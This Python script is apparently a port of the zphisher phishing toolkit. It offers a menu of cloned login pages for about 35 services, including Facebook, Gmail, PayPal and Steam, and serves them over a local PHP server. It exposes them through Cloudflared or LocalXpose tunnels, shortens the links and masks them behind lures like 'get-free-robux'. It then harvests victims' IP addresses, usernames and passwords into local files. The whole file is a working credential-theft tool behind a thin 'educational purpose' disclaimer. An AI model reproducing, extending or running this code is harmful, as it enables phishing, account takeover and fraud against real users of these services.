#!/usr/bin/env python3
import os
import sys
import time
import shutil
import urllib.request
import subprocess
import signal
import platform
import zipfile
import tarfile
import re
import json

__version__ = "2.3.5"

HOST = "127.0.0.1"
PORT = "8080"

# ANSI colors
RED = "\033[31m"
GREEN = "\033[32m"
ORANGE = "\033[33m"
BLUE = "\033[34m"
MAGENTA = "\033[35m"
CYAN = "\033[36m"
WHITE = "\033[37m"
BLACK = "\033[30m"
REDBG = "\033[41m"
GREENBG = "\033[42m"
ORANGEBG = "\033[43m"
BLUEBG = "\033[44m"
MAGENTABG = "\033[45m"
CYANBG = "\033[46m"
WHITEBG = "\033[47m"
BLACKBG = "\033[40m"
RESETBG = "\033[0m"

BASE_DIR = os.path.dirname(os.path.realpath(__file__))

# globals for settings
website = ""
mask = ""


def reset_color():
    sys.stdout.write(RESETBG + "\n")
    sys.stdout.flush()


def sig_handler(sig, frame):
    print(f"\n\n{RED}[{WHITE}!{RED}]{RED} Program Interrupted.")
    reset_color()
    sys.exit(0)


signal.signal(signal.SIGINT, sig_handler)
signal.signal(signal.SIGTERM, sig_handler)


def setup_env():
    if not os.path.isdir(".server"):
        os.makedirs(".server")
    if not os.path.isdir("auth"):
        os.makedirs("auth")
    if os.path.isdir(".server/www"):
        shutil.rmtree(".server/www")
    os.makedirs(".server/www")

    if os.path.exists(".server/.loclx"):
        os.remove(".server/.loclx")
    if os.path.exists(".server/.cld.log"):
        os.remove(".server/.cld.log")


def kill_pid():
    if platform.system() == "Windows":
        os.system("taskkill /F /IM php.exe >nul 2>&1")
        os.system("taskkill /F /IM cloudflared.exe >nul 2>&1")
        os.system("taskkill /F /IM loclx.exe >nul 2>&1")
    else:
        for p in ["php", "cloudflared", "loclx"]:
            os.system(f"killall {p} > /dev/null 2>&1")


def check_update():
    print(f"\n{GREEN}[{WHITE}+{GREEN}]{CYAN} Checking for update : ", end="")
    try:
        req = urllib.request.Request(
            "https://api.github.com/repos/htr-tech/zphisher/releases/latest",
            headers={"User-Agent": "Mozilla/5.0"},
        )
        with urllib.request.urlopen(req) as response:
            data = json.loads(response.read().decode("utf-8"))
            new_version = data.get("tag_name", "").strip()
            if new_version and new_version != __version__:
                print(f"{ORANGE}update found\n{WHITE}")
                time.sleep(2)
                print(f"\n{GREEN}[{WHITE}+{GREEN}]{ORANGE} Downloading Update...")
                tarball_url = f"https://github.com/htr-tech/zphisher/archive/refs/tags/{new_version}.tar.gz"
                # For simplicity, we just prompt the user
                print(
                    f"\n{GREEN}[{WHITE}+{GREEN}]{CYAN} Please manually pull the latest version or download from {tarball_url}"
                )
            else:
                print(f"{GREEN}up to date\n{WHITE}")
                time.sleep(0.5)
    except Exception:
        print(f"{RED}Offline{WHITE}")


def check_status():
    print(f"\n{GREEN}[{WHITE}+{GREEN}]{CYAN} Internet Status : ", end="")
    try:
        urllib.request.urlopen("https://api.github.com", timeout=3)
        print(f"{GREEN}Online{WHITE}")
        check_update()
    except Exception:
        print(f"{RED}Offline{WHITE}")


def banner():
    print(f"""{ORANGE}
 ______      _     _     _               
|___  /     | |   (_)   | |              
   / / _ __ | |__  _ ___| |__   ___ _ __ 
  / / | '_ \\| '_ \\| / __| '_ \\ / _ \\ '__|
 / /__| |_) | | | | \\__ \\ | | |  __/ |   
/_____| .__/|_| |_|_|___/_| |_|\\___|_|   
      | |                                
      |_|                {RED}Version : {__version__}

{GREEN}[{WHITE}-{GREEN}]{CYAN} Tool Created by htr-tech (tahmid.rayat){WHITE}""")


def banner_small():
    print(f"""{BLUE}
  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀{WHITE} {__version__}""")


def dependencies():
    print(f"\n{GREEN}[{WHITE}+{GREEN}]{CYAN} Checking packages...")
    if platform.system() == "Windows":
        return
    # Skipping deep package checks for python equivalent since python already has standard libs.
    # PHP is required.
    if shutil.which("php") is None:
        print(
            f"\n{RED}[{WHITE}!{RED}]{RED} PHP is not installed. Please install it manually."
        )


def download(url, output):
    file_name = os.path.basename(url)
    if os.path.exists(file_name):
        os.remove(file_name)
    if os.path.exists(output):
        os.remove(output)
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req) as response, open(file_name, "wb") as out_file:
            shutil.copyfileobj(response, out_file)

        if file_name.endswith(".zip"):
            with zipfile.ZipFile(file_name, "r") as zip_ref:
                zip_ref.extractall()
            os.rename(
                zip_ref.namelist()[0] if output not in file_name else output,
                f".server/{output}",
            )
        elif file_name.endswith(".tgz") or file_name.endswith(".tar.gz"):
            with tarfile.open(file_name, "r:gz") as tar_ref:
                tar_ref.extractall()
            os.rename(file_name.replace(".tgz", ""), f".server/{output}")
        else:
            shutil.move(file_name, f".server/{output}")

        if not platform.system() == "Windows":
            os.chmod(f".server/{output}", 0o755)

        if os.path.exists(file_name):
            os.remove(file_name)
    except Exception as e:
        print(f"\n{RED}[{WHITE}!{RED}]{RED} Error occurred while downloading {output}.")
        reset_color()
        sys.exit(1)


def install_cloudflared():
    if os.path.exists(".server/cloudflared") or os.path.exists(
        ".server/cloudflared.exe"
    ):
        print(f"\n{GREEN}[{WHITE}+{GREEN}]{GREEN} Cloudflared already installed.")
    else:
        print(f"\n{GREEN}[{WHITE}+{GREEN}]{CYAN} Installing Cloudflared...{WHITE}")
        arch = platform.machine().lower()
        if platform.system() == "Windows":
            download(
                "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe",
                "cloudflared.exe",
            )
        elif "arm" in arch or "aarch64" in arch:
            download(
                "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64",
                "cloudflared",
            )
        elif "x86_64" in arch or "amd64" in arch:
            download(
                "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64",
                "cloudflared",
            )
        else:
            download(
                "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386",
                "cloudflared",
            )


def install_localxpose():
    if os.path.exists(".server/loclx") or os.path.exists(".server/loclx.exe"):
        print(f"\n{GREEN}[{WHITE}+{GREEN}]{GREEN} LocalXpose already installed.")
    else:
        print(f"\n{GREEN}[{WHITE}+{GREEN}]{CYAN} Installing LocalXpose...{WHITE}")
        arch = platform.machine().lower()
        if platform.system() == "Windows":
            download(
                "https://api.localxpose.io/api/v2/downloads/loclx-windows-amd64.zip",
                "loclx.exe",
            )
        elif "arm" in arch or "aarch64" in arch:
            download(
                "https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip",
                "loclx",
            )
        elif "x86_64" in arch or "amd64" in arch:
            download(
                "https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip",
                "loclx",
            )
        else:
            download(
                "https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip",
                "loclx",
            )


def msg_exit():
    os.system("cls" if os.name == "nt" else "clear")
    banner()
    print(
        f"\n{GREENBG}{BLACK} Thank you for using this tool. Have a good day.{RESETBG}\n"
    )
    reset_color()
    sys.exit(0)


def about():
    os.system("cls" if os.name == "nt" else "clear")
    banner()
    print(f"""
{GREEN} Author   {RED}:  {ORANGE}TAHMID RAYAT {RED}[ {ORANGE}HTR-TECH {RED}]
{GREEN} Github   {RED}:  {CYAN}https://github.com/htr-tech
{GREEN} Social   {RED}:  {CYAN}https://tahmidrayat.is-a.dev
{GREEN} Version  {RED}:  {ORANGE}{__version__}

{WHITE} {REDBG}Warning:{RESETBG}
{CYAN}  This Tool is made for educational purpose 
  only {RED}!{WHITE}{CYAN} Author will not be responsible for 
  any misuse of this toolkit {RED}!{WHITE}

{WHITE} {CYANBG}Special Thanks to:{RESETBG}
{GREEN}  1RaY-1, Adi1090x, AliMilani, BDhackers009,
  KasRoudra, E343IO, sepp0, ThelinuxChoice,
  Yisus7u7

{RED}[{WHITE}00{RED}]{ORANGE} Main Menu     {RED}[{WHITE}99{RED}]{ORANGE} Exit
""")
    reply = input(f"{RED}[{WHITE}-{RED}]{GREEN} Select an option : {BLUE}")
    if reply in ["99"]:
        msg_exit()
    elif reply in ["0", "00"]:
        print(f"\n{GREEN}[{WHITE}+{GREEN}]{CYAN} Returning to main menu...")
        time.sleep(1)
        main_menu()
    else:
        print(f"\n{RED}[{WHITE}!{RED}]{RED} Invalid Option, Try Again...")
        time.sleep(1)
        about()


def cusport():
    global PORT
    print()
    ans = input(
        f"{RED}[{WHITE}?{RED}]{ORANGE} Do You Want A Custom Port {GREEN}[{CYAN}y{GREEN}/{CYAN}N{GREEN}]: {ORANGE}"
    )
    if ans.lower() == "y":
        print("\n")
        cu_p = input(
            f"{RED}[{WHITE}-{RED}]{ORANGE} Enter Your Custom 4-digit Port [1024-9999] : {WHITE}"
        )
        if cu_p.isdigit() and 1024 <= int(cu_p) <= 9999:
            PORT = cu_p
            print()
        else:
            print(
                f"\n\n{RED}[{WHITE}!{RED}]{RED} Invalid 4-digit Port : {cu_p}, Try Again...{WHITE}"
            )
            time.sleep(2)
            os.system("cls" if os.name == "nt" else "clear")
            banner_small()
            cusport()
    else:
        print(f"\n\n{RED}[{WHITE}-{RED}]{BLUE} Using Default Port {PORT}...{WHITE}\n")


def setup_site():
    print(f"\n{RED}[{WHITE}-{RED}]{BLUE} Setting up server...{WHITE}")
    site_dir = os.path.join(".sites", website)
    for item in os.listdir(site_dir):
        s = os.path.join(site_dir, item)
        d = os.path.join(".server/www", item)
        if os.path.isdir(s):
            shutil.copytree(s, d, dirs_exist_ok=True)
        else:
            shutil.copy2(s, d)
    shutil.copy2(".sites/ip.php", ".server/www/ip.php")
    print(f"\n{RED}[{WHITE}-{RED}]{BLUE} Starting PHP server...{WHITE}")
    subprocess.Popen(
        ["php", "-S", f"{HOST}:{PORT}"],
        cwd=".server/www",
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )


def capture_ip():
    if os.path.exists(".server/www/ip.txt"):
        with open(".server/www/ip.txt", "r") as f:
            lines = f.readlines()
        ip = ""
        for line in lines:
            if "IP: " in line:
                ip = line.split("IP: ")[1].strip()
        print(f"\n{RED}[{WHITE}-{RED}]{GREEN} Victim's IP : {BLUE}{ip}")
        print(f"\n{RED}[{WHITE}-{RED}]{BLUE} Saved in : {ORANGE}auth/ip.txt")
        with open("auth/ip.txt", "a") as f:
            f.writelines(lines)


def capture_creds():
    if os.path.exists(".server/www/usernames.txt"):
        with open(".server/www/usernames.txt", "r") as f:
            lines = f.readlines()
        account = ""
        password = ""
        for line in lines:
            if "Username:" in line:
                account = line.split("Username:")[1].strip()
            if "Pass:" in line:
                password = line.split("Pass:")[1].split(".")[-1].strip()
        print(f"\n{RED}[{WHITE}-{RED}]{GREEN} Account : {BLUE}{account}")
        print(f"\n{RED}[{WHITE}-{RED}]{GREEN} Password : {BLUE}{password}")
        print(f"\n{RED}[{WHITE}-{RED}]{BLUE} Saved in : {ORANGE}auth/usernames.dat")
        with open("auth/usernames.dat", "a") as f:
            f.writelines(lines)
        print(
            f"\n{RED}[{WHITE}-{RED}]{ORANGE} Waiting for Next Login Info, {BLUE}Ctrl + C {ORANGE}to exit. ",
            end="",
        )


def capture_data():
    print(
        f"\n{RED}[{WHITE}-{RED}]{ORANGE} Waiting for Login Info, {BLUE}Ctrl + C {ORANGE}to exit..."
    )
    try:
        while True:
            if os.path.exists(".server/www/ip.txt"):
                print(f"\n\n{RED}[{WHITE}-{RED}]{GREEN} Victim IP Found !")
                capture_ip()
                os.remove(".server/www/ip.txt")
            time.sleep(0.75)
            if os.path.exists(".server/www/usernames.txt"):
                print(f"\n\n{RED}[{WHITE}-{RED}]{GREEN} Login info Found !!")
                capture_creds()
                os.remove(".server/www/usernames.txt")
            time.sleep(0.75)
    except KeyboardInterrupt:
        pass


def custom_mask():
    global mask
    time.sleep(0.5)
    os.system("cls" if os.name == "nt" else "clear")
    banner_small()
    print()
    mask_op = input(
        f"{RED}[{WHITE}?{RED}]{ORANGE} Do you want to change Mask URL? {GREEN}[{CYAN}y{GREEN}/{CYAN}N{GREEN}] :{ORANGE} "
    )
    print()
    if mask_op.lower() == "y":
        print(
            f"\n{RED}[{WHITE}-{RED}]{GREEN} Enter your custom URL below {CYAN}({ORANGE}Example: https://get-free-followers.com{CYAN})\n"
        )
        mask_url = input(f"{WHITE} ==> {ORANGE}")
        if mask_url == "":
            mask_url = "https://"
        if mask_url.startswith("http") or mask_url.startswith("www"):
            mask = mask_url
            print(
                f"\n{RED}[{WHITE}-{RED}]{CYAN} Using custom Masked Url :{GREEN} {mask}"
            )
        else:
            print(
                f"\n{RED}[{WHITE}!{RED}]{ORANGE} Invalid url type..Using the Default one.."
            )


def site_stat(url):
    try:
        urllib.request.urlopen(url + "https://github.com", timeout=3)
        return True
    except Exception:
        return False


def shorten(api, url):
    try:
        req = urllib.request.Request(api + url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req) as response:
            data = response.read().decode("utf-8")
            if "shrtco.de" in api:
                js = json.loads(data)
                return js.get("result", {}).get("short_link2", "")
            else:
                return data.strip()
    except Exception:
        return ""


def custom_url(url):
    url = url.replace("http://", "").replace("https://", "")
    isgd = "https://is.gd/create.php?format=simple&url="
    shortcode = "https://api.shrtco.de/v2/shorten?url="
    tinyurl = "https://tinyurl.com/api-create.php?url="

    custom_mask()
    time.sleep(1)
    os.system("cls" if os.name == "nt" else "clear")
    banner_small()

    processed_url = ""
    if "trycloudflare.com" in url or "loclx.io" in url:
        if site_stat(isgd):
            processed_url = shorten(isgd, url)
        elif site_stat(shortcode):
            processed_url = shorten(shortcode, url)
        else:
            processed_url = shorten(tinyurl, url)

        processed_url = processed_url.replace("http://", "").replace("https://", "")
        masked_url = f"{mask}@{processed_url}"
        processed_url = f"https://{processed_url}"
        url = f"https://{url}"
    else:
        url = "Unable to generate links. Try after turning on hotspot"
        processed_url = "Unable to Short URL"
        masked_url = ""

    print(f"\n{RED}[{WHITE}-{RED}]{BLUE} URL 1 : {GREEN}{url}")
    print(f"\n{RED}[{WHITE}-{RED}]{BLUE} URL 2 : {ORANGE}{processed_url}")
    if "Unable" not in processed_url:
        print(f"\n{RED}[{WHITE}-{RED}]{BLUE} URL 3 : {ORANGE}{masked_url}")


def start_cloudflared():
    if os.path.exists(".server/.cld.log"):
        os.remove(".server/.cld.log")
    cusport()
    print(
        f"\n{RED}[{WHITE}-{RED}]{GREEN} Initializing... {GREEN}( {CYAN}http://{HOST}:{PORT} {GREEN})"
    )
    time.sleep(1)
    setup_site()
    print(f"\n\n{RED}[{WHITE}-{RED}]{GREEN} Launching Cloudflared...")

    cld_bin = (
        ".server/cloudflared.exe"
        if platform.system() == "Windows"
        else "./.server/cloudflared"
    )
    with open(".server/.cld.log", "w") as log:
        subprocess.Popen(
            [cld_bin, "tunnel", "-url", f"{HOST}:{PORT}"], stdout=log, stderr=log
        )

    time.sleep(8)
    cldflr_url = ""
    if os.path.exists(".server/.cld.log"):
        with open(".server/.cld.log", "r") as f:
            content = f.read()
            match = re.search(r"https://[-0-9a-z]*\.trycloudflare\.com", content)
            if match:
                cldflr_url = match.group(0)

    custom_url(cldflr_url)
    capture_data()


def localxpose_auth():
    loclx_bin = (
        ".server/loclx.exe" if platform.system() == "Windows" else "./.server/loclx"
    )
    subprocess.Popen(
        [loclx_bin, "-help"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(1)

    auth_f = (
        ".localxpose/.access"
        if os.path.isdir(".localxpose")
        else os.path.join(os.path.expanduser("~"), ".localxpose", ".access")
    )
    os.makedirs(os.path.dirname(auth_f), exist_ok=True)

    status = subprocess.run(
        [loclx_bin, "account", "status"], capture_output=True, text=True
    )
    if "Error" in status.stdout or "Error" in status.stderr:
        print(
            f"\n\n{RED}[{WHITE}!{RED}]{GREEN} Create an account on {ORANGE}localxpose.io{GREEN} & copy the token\n"
        )
        time.sleep(3)
        loclx_token = input(
            f"{RED}[{WHITE}-{RED}]{ORANGE} Input Loclx Token :{ORANGE} "
        )
        if not loclx_token:
            print(f"\n{RED}[{WHITE}!{RED}]{RED} You have to input Localxpose Token.")
            time.sleep(2)
            tunnel_menu()
        else:
            with open(auth_f, "w") as f:
                f.write(loclx_token)


def start_loclx():
    cusport()
    print(
        f"\n{RED}[{WHITE}-{RED}]{GREEN} Initializing... {GREEN}( {CYAN}http://{HOST}:{PORT} {GREEN})"
    )
    time.sleep(1)
    setup_site()
    localxpose_auth()

    print("\n")
    opinion = input(
        f"{RED}[{WHITE}?{RED}]{ORANGE} Change Loclx Server Region? {GREEN}[{CYAN}y{GREEN}/{CYAN}N{GREEN}]:{ORANGE} "
    )
    loclx_region = "eu" if opinion.lower() == "y" else "us"
    print(f"\n\n{RED}[{WHITE}-{RED}]{GREEN} Launching LocalXpose...")

    loclx_bin = (
        ".server/loclx.exe" if platform.system() == "Windows" else "./.server/loclx"
    )
    with open(".server/.loclx", "w") as log:
        subprocess.Popen(
            [
                loclx_bin,
                "tunnel",
                "--raw-mode",
                "http",
                "--region",
                loclx_region,
                "--https-redirect",
                "-t",
                f"{HOST}:{PORT}",
            ],
            stdout=log,
            stderr=log,
        )

    time.sleep(12)
    loclx_url = ""
    if os.path.exists(".server/.loclx"):
        with open(".server/.loclx", "r") as f:
            content = f.read()
            match = re.search(r"[0-9a-zA-Z.]*\.loclx\.io", content)
            if match:
                loclx_url = match.group(0)

    custom_url(loclx_url)
    capture_data()


def start_localhost():
    cusport()
    print(
        f"\n{RED}[{WHITE}-{RED}]{GREEN} Initializing... {GREEN}( {CYAN}http://{HOST}:{PORT} {GREEN})"
    )
    setup_site()
    time.sleep(1)
    os.system("cls" if os.name == "nt" else "clear")
    banner_small()
    print(
        f"\n{RED}[{WHITE}-{RED}]{GREEN} Successfully Hosted at : {GREEN}{CYAN}http://{HOST}:{PORT} {GREEN}"
    )
    capture_data()


def tunnel_menu():
    os.system("cls" if os.name == "nt" else "clear")
    banner_small()
    print(f"""
{RED}[{WHITE}01{RED}]{ORANGE} Localhost
{RED}[{WHITE}02{RED}]{ORANGE} Cloudflared  {RED}[{CYAN}Auto Detects{RED}]
{RED}[{WHITE}03{RED}]{ORANGE} LocalXpose   {RED}[{CYAN}NEW! Max 15Min{RED}]
""")
    reply = input(
        f"{RED}[{WHITE}-{RED}]{GREEN} Select a port forwarding service : {BLUE}"
    )
    if reply in ["1", "01"]:
        start_localhost()
    elif reply in ["2", "02"]:
        start_cloudflared()
    elif reply in ["3", "03"]:
        start_loclx()
    else:
        print(f"\n{RED}[{WHITE}!{RED}]{RED} Invalid Option, Try Again...")
        time.sleep(1)
        tunnel_menu()


def site_facebook():
    global website, mask
    print(f"""
{RED}[{WHITE}01{RED}]{ORANGE} Traditional Login Page
{RED}[{WHITE}02{RED}]{ORANGE} Advanced Voting Poll Login Page
{RED}[{WHITE}03{RED}]{ORANGE} Fake Security Login Page
{RED}[{WHITE}04{RED}]{ORANGE} Facebook Messenger Login Page
""")
    reply = input(f"{RED}[{WHITE}-{RED}]{GREEN} Select an option : {BLUE}")
    if reply in ["1", "01"]:
        website = "facebook"
        mask = "https://blue-verified-badge-for-facebook-free"
        tunnel_menu()
    elif reply in ["2", "02"]:
        website = "fb_advanced"
        mask = "https://vote-for-the-best-social-media"
        tunnel_menu()
    elif reply in ["3", "03"]:
        website = "fb_security"
        mask = "https://make-your-facebook-secured-and-free-from-hackers"
        tunnel_menu()
    elif reply in ["4", "04"]:
        website = "fb_messenger"
        mask = "https://get-messenger-premium-features-free"
        tunnel_menu()
    else:
        print(f"\n{RED}[{WHITE}!{RED}]{RED} Invalid Option, Try Again...")
        time.sleep(1)
        os.system("cls" if os.name == "nt" else "clear")
        banner_small()
        site_facebook()


def site_instagram():
    global website, mask
    print(f"""
{RED}[{WHITE}01{RED}]{ORANGE} Traditional Login Page
{RED}[{WHITE}02{RED}]{ORANGE} Auto Followers Login Page
{RED}[{WHITE}03{RED}]{ORANGE} 1000 Followers Login Page
{RED}[{WHITE}04{RED}]{ORANGE} Blue Badge Verify Login Page
""")
    reply = input(f"{RED}[{WHITE}-{RED}]{GREEN} Select an option : {BLUE}")
    if reply in ["1", "01"]:
        website = "instagram"
        mask = "https://get-unlimited-followers-for-instagram"
        tunnel_menu()
    elif reply in ["2", "02"]:
        website = "ig_followers"
        mask = "https://get-unlimited-followers-for-instagram"
        tunnel_menu()
    elif reply in ["3", "03"]:
        website = "insta_followers"
        mask = "https://get-1000-followers-for-instagram"
        tunnel_menu()
    elif reply in ["4", "04"]:
        website = "ig_verify"
        mask = "https://blue-badge-verify-for-instagram-free"
        tunnel_menu()
    else:
        print(f"\n{RED}[{WHITE}!{RED}]{RED} Invalid Option, Try Again...")
        time.sleep(1)
        os.system("cls" if os.name == "nt" else "clear")
        banner_small()
        site_instagram()


def site_gmail():
    global website, mask
    print(f"""
{RED}[{WHITE}01{RED}]{ORANGE} Gmail Old Login Page
{RED}[{WHITE}02{RED}]{ORANGE} Gmail New Login Page
{RED}[{WHITE}03{RED}]{ORANGE} Advanced Voting Poll
""")
    reply = input(f"{RED}[{WHITE}-{RED}]{GREEN} Select an option : {BLUE}")
    if reply in ["1", "01"]:
        website = "google"
        mask = "https://get-unlimited-google-drive-free"
        tunnel_menu()
    elif reply in ["2", "02"]:
        website = "google_new"
        mask = "https://get-unlimited-google-drive-free"
        tunnel_menu()
    elif reply in ["3", "03"]:
        website = "google_poll"
        mask = "https://vote-for-the-best-social-media"
        tunnel_menu()
    else:
        print(f"\n{RED}[{WHITE}!{RED}]{RED} Invalid Option, Try Again...")
        time.sleep(1)
        os.system("cls" if os.name == "nt" else "clear")
        banner_small()
        site_gmail()


def site_vk():
    global website, mask
    print(f"""
{RED}[{WHITE}01{RED}]{ORANGE} Traditional Login Page
{RED}[{WHITE}02{RED}]{ORANGE} Advanced Voting Poll Login Page
""")
    reply = input(f"{RED}[{WHITE}-{RED}]{GREEN} Select an option : {BLUE}")
    if reply in ["1", "01"]:
        website = "vk"
        mask = "https://vk-premium-real-method-2020"
        tunnel_menu()
    elif reply in ["2", "02"]:
        website = "vk_poll"
        mask = "https://vote-for-the-best-social-media"
        tunnel_menu()
    else:
        print(f"\n{RED}[{WHITE}!{RED}]{RED} Invalid Option, Try Again...")
        time.sleep(1)
        os.system("cls" if os.name == "nt" else "clear")
        banner_small()
        site_vk()


def main_menu():
    global website, mask
    os.system("cls" if os.name == "nt" else "clear")
    banner()
    print(f"""
{RED}[{WHITE}::{RED}]{ORANGE} Select An Attack For Your Victim {RED}[{WHITE}::{RED}]{ORANGE}

{RED}[{WHITE}01{RED}]{ORANGE} Facebook      {RED}[{WHITE}11{RED}]{ORANGE} Twitch       {RED}[{WHITE}21{RED}]{ORANGE} DeviantArt
{RED}[{WHITE}02{RED}]{ORANGE} Instagram     {RED}[{WHITE}12{RED}]{ORANGE} Pinterest    {RED}[{WHITE}22{RED}]{ORANGE} Badoo
{RED}[{WHITE}03{RED}]{ORANGE} Google        {RED}[{WHITE}13{RED}]{ORANGE} Snapchat     {RED}[{WHITE}23{RED}]{ORANGE} Origin
{RED}[{WHITE}04{RED}]{ORANGE} Microsoft     {RED}[{WHITE}14{RED}]{ORANGE} Linkedin     {RED}[{WHITE}24{RED}]{ORANGE} DropBox	
{RED}[{WHITE}05{RED}]{ORANGE} Netflix       {RED}[{WHITE}15{RED}]{ORANGE} Ebay         {RED}[{WHITE}25{RED}]{ORANGE} Yahoo		
{RED}[{WHITE}06{RED}]{ORANGE} Paypal        {RED}[{WHITE}16{RED}]{ORANGE} Quora        {RED}[{WHITE}26{RED}]{ORANGE} Wordpress
{RED}[{WHITE}07{RED}]{ORANGE} Steam         {RED}[{WHITE}17{RED}]{ORANGE} Protonmail   {RED}[{WHITE}27{RED}]{ORANGE} Yandex			
{RED}[{WHITE}08{RED}]{ORANGE} Twitter       {RED}[{WHITE}18{RED}]{ORANGE} Spotify      {RED}[{WHITE}28{RED}]{ORANGE} StackoverFlow
{RED}[{WHITE}09{RED}]{ORANGE} Playstation   {RED}[{WHITE}19{RED}]{ORANGE} Reddit       {RED}[{WHITE}29{RED}]{ORANGE} Vk
{RED}[{WHITE}10{RED}]{ORANGE} Tiktok        {RED}[{WHITE}20{RED}]{ORANGE} Adobe        {RED}[{WHITE}30{RED}]{ORANGE} XBOX
{RED}[{WHITE}31{RED}]{ORANGE} Mediafire     {RED}[{WHITE}32{RED}]{ORANGE} Gitlab       {RED}[{WHITE}33{RED}]{ORANGE} Github
{RED}[{WHITE}34{RED}]{ORANGE} Discord       {RED}[{WHITE}35{RED}]{ORANGE} Roblox 

{RED}[{WHITE}99{RED}]{ORANGE} About         {RED}[{WHITE}00{RED}]{ORANGE} Exit
""")
    reply = input(f"{RED}[{WHITE}-{RED}]{GREEN} Select an option : {BLUE}")

    opts = {
        "4": ("microsoft", "https://unlimited-onedrive-space-for-free"),
        "04": ("microsoft", "https://unlimited-onedrive-space-for-free"),
        "5": ("netflix", "https://upgrade-your-netflix-plan-free"),
        "05": ("netflix", "https://upgrade-your-netflix-plan-free"),
        "6": ("paypal", "https://get-500-usd-free-to-your-acount"),
        "06": ("paypal", "https://get-500-usd-free-to-your-acount"),
        "7": ("steam", "https://steam-500-usd-gift-card-free"),
        "07": ("steam", "https://steam-500-usd-gift-card-free"),
        "8": ("twitter", "https://get-blue-badge-on-twitter-free"),
        "08": ("twitter", "https://get-blue-badge-on-twitter-free"),
        "9": ("playstation", "https://playstation-500-usd-gift-card-free"),
        "09": ("playstation", "https://playstation-500-usd-gift-card-free"),
        "10": ("tiktok", "https://tiktok-free-liker"),
        "11": ("twitch", "https://unlimited-twitch-tv-user-for-free"),
        "12": ("pinterest", "https://get-a-premium-plan-for-pinterest-free"),
        "13": ("snapchat", "https://view-locked-snapchat-accounts-secretly"),
        "14": ("linkedin", "https://get-a-premium-plan-for-linkedin-free"),
        "15": ("ebay", "https://get-500-usd-free-to-your-acount"),
        "16": ("quora", "https://quora-premium-for-free"),
        "17": ("protonmail", "https://protonmail-pro-basics-for-free"),
        "18": ("spotify", "https://convert-your-account-to-spotify-premium"),
        "19": ("reddit", "https://reddit-official-verified-member-badge"),
        "20": ("adobe", "https://get-adobe-lifetime-pro-membership-free"),
        "21": ("deviantart", "https://get-500-usd-free-to-your-acount"),
        "22": ("badoo", "https://get-500-usd-free-to-your-acount"),
        "23": ("origin", "https://get-500-usd-free-to-your-acount"),
        "24": ("dropbox", "https://get-1TB-cloud-storage-free"),
        "25": ("yahoo", "https://grab-mail-from-anyother-yahoo-account-free"),
        "26": ("wordpress", "https://unlimited-wordpress-traffic-free"),
        "27": ("yandex", "https://grab-mail-from-anyother-yandex-account-free"),
        "28": (
            "stackoverflow",
            "https://get-stackoverflow-lifetime-pro-membership-free",
        ),
        "30": ("xbox", "https://get-500-usd-free-to-your-acount"),
        "31": ("mediafire", "https://get-1TB-on-mediafire-free"),
        "32": ("gitlab", "https://get-1k-followers-on-gitlab-free"),
        "33": ("github", "https://get-1k-followers-on-github-free"),
        "34": ("discord", "https://get-discord-nitro-free"),
        "35": ("roblox", "https://get-free-robux"),
    }

    if reply in ["1", "01"]:
        site_facebook()
    elif reply in ["2", "02"]:
        site_instagram()
    elif reply in ["3", "03"]:
        site_gmail()
    elif reply in ["29"]:
        site_vk()
    elif reply in opts:
        website, mask = opts[reply]
        tunnel_menu()
    elif reply in ["99"]:
        about()
    elif reply in ["0", "00"]:
        msg_exit()
    else:
        print(f"\n{RED}[{WHITE}!{RED}]{RED} Invalid Option, Try Again...")
        time.sleep(1)
        main_menu()


if __name__ == "__main__":
    kill_pid()
    dependencies()
    check_status()
    setup_env()
    install_cloudflared()
    install_localxpose()
    main_menu()
